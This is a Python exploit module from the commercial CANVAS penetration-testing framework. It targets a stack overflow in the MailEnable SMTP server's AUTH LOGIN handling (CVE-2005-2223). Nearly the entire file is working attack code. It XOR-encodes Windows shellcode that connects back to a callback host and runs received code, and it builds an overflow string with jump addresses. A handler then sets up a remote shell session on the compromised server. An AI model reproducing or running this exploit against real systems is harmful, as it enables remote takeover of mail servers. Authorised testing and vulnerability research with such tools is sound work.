#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2003-2005
#http://www.immunityinc.com/CANVAS/ for more information


#Part of CANVAS For licensing information, please refer to your
#Immunity CANVAS licensing documentation



import sys
import socket
import time

if "." not in sys.path: sys.path.append(".")

import base64
from exploitutils import *
from tcpexploit import tcpexploit
from MOSDEF import mosdef as mosdef
from shellcode import shellcodeGenerator
from win32Node import win32Node
import win32MosdefShellServer
import canvasengine
import smtplib

# GUI info
NAME="MailEnable SMTP Stack Overflow"
DESCRIPTION="MailEnable Stack Overflow"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="MailEnable"
DOCUMENTATION["Date public"] = "\"Dos\" Fixed in Patch"
DOCUMENTATION["Platforms Tested"] = "Windows 2003 Standard edition base & up2date MailEnable 1.72\n"+\
"Windows 2003 Standard edition up2date MailEnable 1.80"
DOCUMENTATION["Post-exploitaion"]=""
DOCUMENTATION["CVE Name"] = "CVE-2005-2223"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2223"
DOCUMENTATION['CVSS'] = 5.0

VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000","XP","2003" ]

NOTES = """
This exploit should be universal.

Tested on the following:
        
Windows 2003 Standard edition base & up2date MailEnable 1.72
Windows 2003 Standard edition up2date MailEnable 1.80
Windows 2000 Server SP4 EN 

http://www.mailenable.com/hotfix/default.asp
May 30th, 2006
"Fixes possible crashing on inbound SMTP authentication"

Banner should look something like this:
220 AQUARIUS.localdomain ESMTP MailEnable Service, Version: 0-1.54- ready at 04/22/02 19:03:16

"""

CHANGELOG="""

"""


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.covertness = 0
        self.port = 25
        self.host = "10.10.10.7"
        self.localhost = "192.168.0.2"
        self.localport = 5555
        self.badstring = "\x00\r\n\x20" 
        self.name=NAME
        self.listenerArgsDict["fromcreatethread"] = 1
        return
    
    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def xorEncode(self, shellcode, xorbyte):
        xorsc = "\xEB\x13\x5F\x8B\xF7\x33\xC9\x66\xB9" + struct.pack("<H", len(shellcode)) +\
                "\x80\x36" + struct.pack("<B", xorbyte) + "\x46\xE0\xFA\x8B\xCF\xEB\x05\xE8\xE8\xFF\xFF\xFF"
        
        xorshellcode = ""
        for each in shellcode:
            a = ord(each) ^ xorbyte
            xorshellcode += struct.pack("<B", a)

        sc = xorsc + xorshellcode
        
        for each in self.badstring:
            cnt = sc.count(each)
            if cnt != 0:
                #print "%.2x found %d many times" % (ord(each), cnt)
                return ""

        return sc
        
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        self.localhost=host
        self.localport=port
    
        #if smallcode is zero, then use fromcreatethread if running from commandline.
        #self.shellcode=self.createHeapSafeInjectIntoProcess(self.badstring,host,port,smallcode=0,processname="lsass.exe")
        #return self.shellcode
    
        sc = shellcodeGenerator.win32()
        sc.addAttr("findeipnoesp",{"subespval": 0x1000 })
                
        #callback
        #sc.addAttr("revert_to_self_before_importing_ws2_32", None)
        sc.addAttr("tcpconnect", {"port" : port, "ipaddress" : host})
        sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        sc.addAttr("ExitThread", None)
        #GOcode too big for now, use the ordinal code later
        #sc.addAttr("GOFindSock",None)
        #sc.addAttr("LoadRegAsFD", {"reg" : "esi"})
        #sc.addAttr("CreateThreadRecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
        #sc.addAttr("ExitThread", None)
                                                                                                                                                        
        rawshellcode = sc.get()
        #rawshellcode = "\xcc"+rawshellcode
        """                                                                        
        self.log("Raw shellcode (before encoding) is %d byte"%len(rawshellcode))        
        encoder= addencoder.inteladdencoder()
        encoder.setbadstring(self.badstring)
        self.log( "Encoding shellcode. This may take a while if we don't find a good value in the cache.")
        shellcode=encoder.encode(rawshellcode)
        self.log( "Done encoding shellcode.")
        if shellcode=="":
            self.log( "Could not encode shellcode")
            raise "ErrorEncodingShellcode"
        """
        cnt = 0xff
        while cnt:
            shellcode = self.xorEncode(rawshellcode, cnt)
            if shellcode != "":
                break
            else:
                cnt -= 1
        
        if len(shellcode) == 0:
            raise Exception, "Could not encode shellcode!"

        """
        print "< %d" % shellcode.count("<")
        print "> %d" % shellcode.count(">")
        print "@ %d" % shellcode.count("@")
        print ": %d" % shellcode.count(":")
        print "\\r %d" % shellcode.count("\r")
        print "\\n %d" % shellcode.count("\n")
        print "NULL %d" % shellcode.count("\x00")
        
        for each in shellcode:
            print "%2.x " % ord(each),
        print "\n"
        """
        self.shellcode = shellcode
        self.log("length of real shellcode: %d"%(len(self.shellcode)))
        return self.shellcode
    
    def getargs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port", self.port))
        return 
    
    def test(self):
        self.getargs()
        s=self.gettcpsock()
        #smtpport=25
        try:
            s.connect((self.host, 25))
        except socket.error, msg:
            self.log("Could not connect")
            return 0

        self.setProgress(25)
        self.log("Sending EHLO FOO")
        try:
            data=s.recv(5000)
            self.log("Banner: %s"%prettyprint(data))
        except:
            self.log("Cannot Get banner")
            return 0
        if "MailEnable" in data:
            self.log("MailEnable server detected")
            return 1
        self.log("MailEnable Server not found!")
        return 0
    
    def handleGoCode(self, sock):
        
        ret=self.checkTriggerWin32(sock)
        if not ret:
            #try twice
            ret=self.checkTriggerWin32(sock)
        if ret:
            self.log("Got trigger!")
            node=win32Node()
            node.parentnode=self.argsDict["passednodes"][0]
            win32MosdefShellServer.win32shellserver(sock,node,self.logfunction)
            node.startup()
            self.setInfo("%s attacking %s:%d - (succeeded!)" % (NAME, self.host, self.port), showlog=1)
            return node
        else:
            self.log("No trigger for win32...failed to call GOcode?")
            self.setInfo("%s attacking %s:%d - (failed!)" % (NAME, self.host, self.port), showlog=1)
            return 0

    def run(self):
        self.getargs()
        self.setInfo("%s attacking %s:%d - (in progress)"% (NAME, self.host, self.port), showlog=1)

        s=self.gettcpsock()
        #smtpport=25
        try:
            s.connect((self.host, 25))
        except socket.error, msg:
            self.log("Could not connect")
            return 0
        except timeoutsocket.Timeout, msg:
            self.log("Connection timeout")
            return 0

        self.setProgress(25)
        self.log("Sending EHLO FOO")
        try:
            data=s.recv(5000)
            self.log("Banner: %s"%prettyprint(data))
            s.sendall("EHLO FOO\r\n")
            data=s.recv(5000)
        except:
            self.log("Cannot EHLO")
            return 0
        self.setProgress(50)

        jmp = base64.encodestring(mosdef.assemble("jmp *%esp", "X86"))[:4]
        
        #older dll based jmp esp
        #addie = 0x70B6106FL #comctl32.dll
        #ovf = "AUTH LOGIN " + "A"*128 + struct.pack("<L", addie) + struct.pack("<L", addie) + struct.pack("<L", (0x7ffdf160L - 0x95d0)) + struct.pack("<L", 0x7ffdf1a0L) +\
        #    struct.pack("<L", 0x7ffdf1a0L) + "B"*4 + self.shellcode
        
        addie = 0x7ffdfe04L
        #decode jmp esp trick
        ovf = "AUTH LOGIN "+ jmp + "A"*128 + struct.pack("<L", addie) + struct.pack("<L", addie - 0x95a0) + struct.pack("<L", (addie+0x10)) + struct.pack("<L", (addie+0x10)) +\
              "A"*4 + self.shellcode
        try:
            s.sendall(ovf+"\r\n")
            data=s.recv(5000)
        except:
            #the recv will timeout, which is ok
            pass

        self.setProgress(75)
        #self.handleGoCode(s.sock)
        #print s.sock.recv(64000)
        s.close()

        time.sleep(2)
        self.setProgress(100)
        
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d (succeeded!)"%(self.name,self.host,self.port), showlog=True)
            self.log("%s done (succeeded!)"%self.name)
            return 1
        
        self.setInfo("%s attacking %s:%d (failed)"%(self.name,self.host,self.port), showlog=True)
        self.log("%s done (failed)"%self.name)
        return 0
    
if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
